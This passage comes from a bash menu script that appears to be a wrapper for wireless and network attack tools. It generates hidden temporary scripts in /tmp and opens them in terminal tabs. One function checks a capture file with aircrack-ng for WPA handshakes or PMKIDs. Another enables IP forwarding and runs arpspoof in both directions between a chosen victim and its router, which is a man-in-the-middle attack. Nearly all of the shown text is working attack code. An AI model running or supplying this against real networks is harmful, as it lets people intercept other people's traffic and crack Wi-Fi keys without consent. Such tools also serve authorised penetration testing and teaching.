touch /tmp/.search >> /dev/null
chmod +x /tmp/.search >> /dev/null
echo 'read -p "Path and file name for the .cap file (ex: /root/capture.cap) => " FILE' >> /tmp/.search
echo "if [ ! -f "\"'$FILE'"\" ]" >> /tmp/.search
echo "then" >> /tmp/.search
echo "exit" >> /tmp/.search
echo "fi" >> /tmp/.search
echo 'echo' >> /tmp/.search
echo "aircrack-ng "'$FILE'" | egrep "\"1 handshake'|'PMKID"\"" >> /tmp/.search
gnome-terminal --tab -- "/tmp/.search" >> /dev/null
rm /tmp/.search >> /dev/null
menuaircrack
}

function arpspoof(){
touch /tmp/.arpspoof >> /dev/null
touch /tmp/.arpspoof1 >> /dev/null
touch /tmp/.arpspoof2 >> /dev/null
chmod +x /tmp/.arpspoof >> /dev/null
chmod +x /tmp/.arpspoof1 >> /dev/null
chmod +x /tmp/.arpspoof2 >> /dev/null
echo 'read -p "Interface to perform the ARP Spoof (ex: wlan0) => " INTERFACE' >> /tmp/.arpspoof
echo "TEST="'$'"(ifconfig | grep "\"'$INTERFACE'"\" | cut -d "\"' '"\" -f1 | cut -d "\"':'"\" -f1)" >> /tmp/.arpspoof
echo "if [ "\"'$TEST'"\" = "\""""\" ] " >> /tmp/.arpspoof
echo 'then' >> /tmp/.arpspoof
echo 'exit' >> /tmp/.arpspoof
echo "fi" >> /tmp/.arpspoof
echo 'read -p "Target device IP (ex: 192.168.1.5) => " TARGET' >> /tmp/.arpspoof
echo 'read -p "Target router IP (ex: 192.168.1.1) => " ROUTER' >> /tmp/.arpspoof
echo 'echo "1" > /proc/sys/net/ipv4/ip_forward' >> /tmp/.arpspoof
echo "echo "\"arpspoof -i ""'$INTERFACE'"" -t ""'$ROUTER'"" ""'$TARGET'"""\""" >> /tmp/.arpspoof1" >> /tmp/.arpspoof
echo "echo "\"arpspoof -i ""'$INTERFACE'"" -t ""'$TARGET'"" ""'$ROUTER'"""\""" >> /tmp/.arpspoof2" >> /tmp/.arpspoof
echo "gnome-terminal --tab -- "\"/tmp/.arpspoof1"\" >> /dev/null" >> /tmp/.arpspoof
echo "gnome-terminal --tab -- "\"/tmp/.arpspoof2"\" >> /dev/null" >> /tmp/.arpspoof
echo "rm /tmp/.arpspoof1" >> /tmp/.arpspoof
echo "rm /tmp/.arpspoof2" >> /tmp/.arpspoof
echo "exit" >> /tmp/.arpspoof
gnome-terminal --tab -- "/tmp/.arpspoof" >> /dev/null
rm /tmp/.arpspoof >> /dev/null
principal
}
version
credits
principal
